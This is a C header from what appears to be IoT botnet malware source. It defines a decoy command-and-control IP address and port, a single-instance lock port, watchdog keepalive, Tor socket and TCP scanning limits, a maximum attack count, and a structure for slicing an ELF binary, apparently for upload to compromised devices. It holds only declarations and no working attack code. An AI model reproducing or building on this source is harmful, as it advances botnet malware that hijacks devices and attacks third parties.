#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))

#define SINGLE_INSTANCE_PORT 39148

#define FAKE_CNC_ADDR INET_ADDR(217,32,184,17)
#define FAKE_CNC_PORT 23

ipv4_t LOCAL_ADDR;

void DO_EVERYTHING();

void ioctl_keepalive(void);

#define BYTES_PER_LINE 128
#define CHARS_PER_BYTE 5
#define MAX_SLICE_LENGTH (BYTES_PER_LINE * CHARS_PER_BYTE)
#define RD_BUFF_MAX 1024

#define CLIENT_MAX 10
#define TOR_SOCK_AMOUNT 101
#define TCP_CONNS_MAX 500
#define TCP_SCAN_DELAY 120
#define MAX_ATTACKS 3

struct tcp_conns_t {
    char port[17];
};

struct elf_file {
    int num_slices;
    unsigned char **slices;
} binary;

uint8_t buffer[100];
int p, httpd_port;


